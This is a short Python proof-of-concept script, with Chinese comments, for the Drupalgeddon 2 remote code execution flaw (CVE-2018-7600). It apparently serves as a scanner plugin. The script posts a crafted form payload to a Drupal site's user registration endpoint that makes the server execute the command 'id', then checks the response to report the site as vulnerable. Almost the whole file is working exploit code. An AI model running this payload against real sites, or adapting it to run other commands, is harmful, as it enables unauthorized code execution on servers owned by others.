import requests
import random

# Drupal Drupalgeddon 2 远程代码执行漏洞
def poc(url, logindict, user_agent, proxy):
    url = url.strip("/")
    header = {
        'User-Agent': user_agent,
        "Content-Type": "application/x-www-form-urlencoded"
    }

    # 漏洞位置
    exploit_url = url + '/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax '
    datas = "form_id=user_register_form&_drupal_ajax=1&mail[#post_render][]=exec&mail[#type]=markup&mail[#markup]=id"
    if proxy:
        proxies = {
            "http": "http://%(proxy)s/" % {'proxy': proxy},
            "https": "http://%(proxy)s/" % {'proxy': proxy}
        }
        response = requests.post(exploit_url, headers=header, data=datas, proxies=proxies)

    else:
        response = requests.post(exploit_url, data=datas, headers=header)
    # with open('b.html','wb') as f:
    #     f.write(response.content)
    # print(response.text)
    if response.status_code == 200:
        if 'command' in response.text:
            return 'Drupal - Drupalgeddon 2 远程代码执行漏洞     漏洞编号：CVE-2018-7600'

def run(url, logindict, user_agent, proxies):
    result = poc(url, logindict, user_agent, proxies)
    return result


